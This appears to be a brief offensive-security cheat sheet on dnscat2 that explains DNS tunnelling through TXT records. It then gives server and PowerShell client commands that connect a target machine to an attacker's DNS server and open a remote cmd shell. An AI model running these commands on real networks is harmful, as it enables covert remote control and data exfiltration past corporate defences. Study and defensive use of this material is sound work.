

- Dnscat2 is a tunnelling tool that uses DNS protocol to send data between two hosts. 
- It uses an encrypted C2 channel and sends data inside TXT records within the DNS protocol. 
- Most Domain environments will have their own DNS server that resolves Domain to IP and route the traffic to external DNS servers.
- However, with dnscat2, the address resolution is requested from an external Server. When Local DNS tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. 




#### BreakDown of how Dnscat2 works with an example

1. Suppose you're inside a corporate network. Most corporate networks have their own DNS server. If local DNS resolution fails, the request will be forwarded to external DNS servers. 
2. Dnscat2 abuses this functionality to extract data via the TXT reccord.
3. The attacker sets up a domain (malicious.xyz) , then sets up a dnscat2 server and configures the NS record of the domain to point to it (dnscat2 server). The attackerâ€™s DNS server can now receive **raw DNS queries** for  ` *.malicious.xyz.`
4. The attacker runs dnscat2-client, which crafts fake DNS requests that **look like queries**, but actually carry **data or command results**.
5. Since, the local DNS server doesn't know how to resolve the requested hostname, it forwards the request to the external DNS server, which is owned by the attacker.
6. The attacker receives the DNS request, and extracts the data out of the TXT field. 




#### Syntax

1. Setting up the Server

```python
sudo ruby dnscat2.rb --dns host=<AttackerIP>,port=53,domain="attacker.local" --no-cache
```



2. Connecting to the server from the target machine

```powershell
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSServer <AttackersIP> -Domain attacker.local -PreSharedSecret <SecretReceivedFromTheServer> -Exec cmd
```


